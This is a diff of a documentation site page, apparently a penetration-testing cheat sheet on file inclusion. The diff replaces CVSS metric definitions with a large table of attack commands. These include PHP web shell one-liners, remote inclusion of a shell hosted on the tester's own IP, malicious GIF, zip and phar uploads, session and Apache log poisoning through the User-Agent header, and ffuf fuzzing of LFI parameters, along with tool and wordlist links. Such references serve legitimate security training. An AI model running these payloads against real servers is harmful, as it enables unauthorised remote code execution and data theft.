+<tr>
+<td><code>/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></td>
+<td>Include remote PHP web shell, inspect received connection, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload</td>
+</tr>
+<tr>
+<td><code>sudo python -m pyftpdlib -p 21</code></td>
+<td>Hosting file through ftp instead</td>
+</tr>
+<tr>
+<td><code>impacket-smbserver -smb2support share $(pwd)</code></td>
+<td>Hosting file through SMB for windows servers, then use <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=\\&lt;OUR_IP&gt;\share\shell.php&amp;cmd=whoami</code> (more likely to work if we were on the same network)</td>
+</tr>
+<tr>
+<td><strong>LFI + Upload</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif</code></td>
+<td>Create malicious image</td>
+</tr>
+<tr>
+<td><code>/index.php?language=./profile_images/shell.gif&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded image</td>
+</tr>
+<tr>
+<td><code>echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php</code></td>
+<td>Create malicious zip archive 'as jpg'</td>
+</tr>
+<tr>
+<td><code>/index.php?language=zip://shell.zip%23shell.php&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded zip</td>
+</tr>
+<tr>
+<td><code>php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg</code></td>
+<td>Create malicious phar 'as jpg'</td>
+</tr>
+<tr>
+<td><code>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&amp;cmd=id</code></td>
+<td>RCE with malicious uploaded phar</td>
+</tr>
+<tr>
+<td><a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html">LFI to RCE via PHPInfo</a></td>
+<td>Obsolete method</td>
+</tr>
+<tr>
+<td><strong>Log Poisoning</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code></td>
+<td>Read PHP session parameters</td>
+</tr>
+<tr>
+<td><code>/index.php?language=session_poisoning</code></td>
+<td>Test if session poisoning possible</td>
+</tr>
+<tr>
+<td><code>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E</code></td>
+<td>Poison PHP session with web shell</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/log/apache2/access.log</code></td>
+<td>Check if access logs available (error.log another common option), Once confirmed try changing user agent in burp and see if it is displayed</td>
+</tr>
+<tr>
+<td><code>curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -A '&lt;?php system($_GET["cmd"]); ?&gt;'</code></td>
+<td>Poison server log by setting user agent</td>
+</tr>
+<tr>
+<td><code>/index.php?language=/var/log/apache2/access.log&amp;cmd=id</code></td>
+<td>RCE through poisoned PHP session</td>
+</tr>
+</tbody>
+</table>
+<p><strong>NOTE</strong> PHPSESSID is saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.</p>
+<p><strong>NOTE</strong> By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\xampp\apache\logs\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\nginx\log\ on Windows. If not default could use an <a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI Wordlist</a> to fuzz for their locations.</p>
+<p><strong>Tip</strong> Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.</p>
+<p><strong>Tip</strong> The User-Agent header is also shown on process files under the Linux /proc/ directory. So, we can try including the /proc/self/environ or /proc/self/fd/N files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p>
+<p>Other possibly readable logs:
+- /var/log/sshd.log
+- /var/log/mail
+- /var/log/vsftpd.log</p>
+<p><strong>TIP</strong> Using curl for RFI</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">curl<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;\n&quot;</span><span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;http://10.129.29.114/index.php?language=http://10.10.14.202:8000/webShell.php&amp;cmd=ls+/&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;&lt;.*&gt;&quot;</span>
+</span><span id="__span-1-2"><span class="c1"># curl flags:</span>
+</span><span id="__span-1-3"><span class="c1">#   -w &quot;\n&quot;: Append newline</span>
+</span><span id="__span-1-4"><span class="c1">#   -s: Silent mode</span>
+</span><span id="__span-1-5"><span class="c1"># grep flags:</span>
+</span><span id="__span-1-6"><span class="c1">#   -v: Invert match (exclude matching lines)</span>
+</span><span id="__span-1-7"><span class="c1">#   &lt;.*&gt;: Regex for lines containing HTML tags</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="misc">Misc</h2>
+<p><strong><a href="https://www.php.net/manual/en/filters.php">PHP filters</a></strong>
+- <a href="https://www.php.net/manual/en/filters.string.php">String Filters</a>
+- <a href="https://www.php.net/manual/en/filters.convert.php">Conversion Filters</a>
+- <a href="https://www.php.net/manual/en/filters.compression.php">Compression Filters</a>
+- <a href="https://www.php.net/manual/en/filters.encryption.php">Encryption Filters</a></p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php</code></td>
+<td>Fuzz for PHP files</td>
+</tr>
+<tr>
+<td><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287</code></td>
+<td>Fuzz page parameters</td>
+</tr>
+<tr>
+<td><code>ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287</code></td>
+<td>Fuzz LFI payloads</td>
+</tr>
+<tr>
+<td><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287</code></td>
+<td>Fuzz webroot path</td>
+</tr>
+<tr>
+<td><code>ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287</code></td>
+<td>Fuzz server configurations</td>
+</tr>
+</tbody>
+</table>
+<h2 id="lfi-wordlists">LFI Wordlists</h2>
 <ul>
-<li><strong>Network (N)</strong>: Attackers can only exploit this vulnerability through the network layer (remotely exploitable).</li>
-<li><strong>Adjacent (A)</strong>: Attackers can exploit this vulnerability only if they reside in the same physical or logical network (secure VPN included).</li>
-<li><strong>Local (L)</strong>: Attackers can exploit this vulnerability only by accessing the target system locally (e.g., keyboard, terminal, etc.) or remotely (e.g., SSH) or through user interaction.</li>
-<li><strong>Physical (P)</strong>: Attackers can exploit this vulnerability through physical interaction/manipulation.</li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI-Jhaddix.txt</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">Webroot path wordlist for Linux</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">Webroot path wordlist for Windows</a></li>
+<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux">Server configurations wordlist for Linux</a></li>
+<li><a href="https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows">Server configurations wordlist for Windows</a></li>
+<li><a href="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#top-25-parameters">Popular LFI parameters</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI">LFI wordlists</a></li>
 </ul>
-<h4 id="attack-complexity">Attack Complexity</h4>
-<p>Depicts the conditions beyond the attackers' control and must be present to exploit the vulnerability successfully.</p>
+<h2 id="lfi-tools">LFI tools</h2>
 <ul>
-<li><strong>Low (L)</strong>: No special preparations should take place to exploit the vulnerability successfully. The attackers can exploit the vulnerability repeatedly without any issue.</li>
-<li><strong>High (H)</strong>: Special preparations and information gathering should take place to exploit the vulnerability successfully.</li>
+<li><a href="https://github.com/D35m0nd142/LFISuite">LFISuite</a></li>
+<li><a href="https://github.com/OsandaMalith/LFiFreak">LFiFreak</a></li>
+<li><a href="https://github.com/mzfr/liffy">liffy</a></li>
 </ul>
-<h4 id="privileges-required">Privileges Required</h4>
-<p>Show the level of privileges the attacker must have to exploit the vulnerability successfully.</p>
-<ul>
-<li><strong>None (N)</strong>: No special access related to settings or files is required to exploit the vulnerability successfully. The vulnerability can be exploited from an unauthorised perspective.</li>
-<li><strong>Low (L)</strong>: Attackers should possess standard user privileges to exploit the vulnerability successfully. The exploitation in this case usually affects files and settings owned by a user or non-sensitive assets.</li>
-<li><strong>High (H)</strong>: Attackers should possess admin-level privileges to exploit the vulnerability successfully. The exploitation in this case usually affects the entire vulnerable system.</li>
-</ul>
-<h4 id="user-interaction">User Interaction</h4>
-<p>Shows if attackers can successfully exploit the vulnerability on their own or user interaction is required.</p>
-<ul>
-<li><strong>None (N)</strong>: Attackers can successfully exploit the vulnerability independently.</li>
-<li><strong>Required (R)</strong>: A user should take some action before the attackers can successfully exploit the vulnerability.</li>
-</ul>
-<h4 id="scope">Scope</h4>
-<p>Shows if successful exploitation of the vulnerability can affect components other than the affected one.</p>
-<ul>
-<li><strong>Unchanged (U)</strong>: Successful exploitation of the vulnerability affects the vulnerable component or affects resources managed by the same security authority.</li>
-<li><strong>Changed (C)</strong>: Successful exploitation of the vulnerability can affect components other than the affected one or resources beyond the scope of the affected component's security authority.</li>
-</ul>
-<h4 id="confidentiality">Confidentiality</h4>
-<p>Shows how much the vulnerable component's confidentiality is affected upon successfully exploiting the vulnerability. Confidentiality limits information access and disclosure to authorised users only and prevents unauthorised users from accessing information.</p>
-<ul>
-<li><strong>None (N)</strong>: The confidentiality of the vulnerable component does not get impacted.</li>
-<li><strong>Low (L)</strong>: The vulnerable component will experience some loss of confidentiality upon successful exploitation of the vulnerability. In this case, the attackers do not have control over what information is obtained.</li>
-<li><strong>High (H)</strong>: The vulnerable component will experience total (or serious) loss of confidentiality upon successfully exploiting the vulnerability. In this case, the attackers have total (or some) control over what information is obtained.</li>
-</ul>
-<h4 id="integrity">Integrity</h4>
-<p>Shows how much the vulnerable component's integrity is affected upon successfully exploiting the vulnerability. Integrity refers to the trustworthiness and veracity of information.</p>
-<ul>
-<li><strong>None (N)</strong>: The integrity of the vulnerable component does not get impacted.</li>
-<li><strong>Low (L)</strong>: Attackers can modify data in a limited manner on the vulnerable component upon successfully exploiting the vulnerability. Attackers do not have control over the consequence of a modification, and the vulnerable component does not get seriously affected in this case.</li>
-<li><strong>High (H)</strong>: Attackers can modify all or critical data on the vulnerable component upon successfully exploiting the vulnerability. Attackers have control over the consequence of a modification, and the vulnerable component will experience a total loss of integrity.</li>
-</ul>
-<h4 id="availability">Availability</h4>
-<p>Shows how much the vulnerable component's availability is affected upon successfully exploiting the vulnerability. Availability refers to the accessibility of information resources in terms of network bandwidth, disk space, processor cycles, etc.</p>
-<ul>
-<li><strong>None (N)</strong>: The availability of the vulnerable component does not get impacted.</li>
-<li><strong>Low (L)</strong>: The vulnerable component will experience some loss of availability upon successfully exploiting the vulnerability. The attacker does not have complete control over the vulnerable component's availability and cannot deny the service to users, and performance is just reduced.</li>
-<li><strong>High (H)</strong>: The vulnerable component will experience total (or severe) availability loss upon successfully exploiting the vulnerability. The attacker has complete (or significant) control over the vulnerable component's availability and can deny the service to users. Performance is significantly reduced.</li>
-</ul>
+<h2 id="file-inclusion-functions">File Inclusion Functions</h2>
+<table>
+<thead>
+<tr>
+<th>Function</th>
+<th>Read Content</th>
+<th>Execute</th>
+<th>Remote URL</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PHP</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>include()/include_once()</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>require()/require_once()</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>file_get_contents()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>fopen()/file()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>NodeJS</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>fs.readFile()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>fs.sendFile()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>res.render()</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>No</td>
+</tr>
+<tr>
+<td><strong>Java</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>import</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><strong>.NET</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>@Html.Partial()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>@Html.RemotePartial()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td><code>Response.WriteFile()</code></td>
+<td>Yes</td>
+<td>No</td>
+<td>No</td>
+</tr>
+<tr>
+<td><code>include</code></td>
+<td>Yes</td>
+<td>Yes</td>
+<td>Yes</td>
+</tr>
+</tbody>
+</table>
 
 
 
@@ -2257,10 +2478,10 @@
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "..", "features": ["content.code.copy"], "search": "../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
       
     
   </body>
